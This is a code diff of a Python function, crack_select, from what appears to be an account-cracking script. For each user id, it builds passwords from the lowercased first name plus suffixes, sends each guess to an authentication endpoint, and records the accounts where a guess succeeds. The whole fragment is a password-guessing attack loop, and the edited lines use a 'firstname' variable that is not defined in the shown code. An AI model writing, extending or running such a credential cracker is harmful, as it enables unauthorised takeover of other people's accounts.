@@ -277,7 +277,7 @@ def crack_select():
         user = arg
         uid, name = user.split('|')
         try:
-            pass1 = name.lower() + pass1
+            pass1 = firstname.lower() + p1
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
             q = json.loads(data)
             if 'loc' in q:
@@ -293,7 +293,7 @@ def crack_select():
                 cp.close()
                 cps.append(uid + pass1)
             else:
-                pass2 = name.lower() + pass2
+                pass2 = firstname.lower() + p2
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                 q = json.loads(data)
                 if 'loc' in q:
@@ -309,7 +309,7 @@ def crack_select():
                     cp.close()
                     cps.append(uid + pass2)
                 else:
-                    pass3 = name.lower() + p3
+                    pass3 = firstname.lower() + p3
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                     q = json.loads(data)
                     if 'loc' in q:
@@ -325,7 +325,7 @@ def crack_select():
                         cp.close()
                         cps.append(uid + pass3)
                     else:
-                        pass4 = name.lower() + p4
+                        pass4 = firstname.lower() + p4
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                         q = json.loads(data)
                         if 'loc' in q:
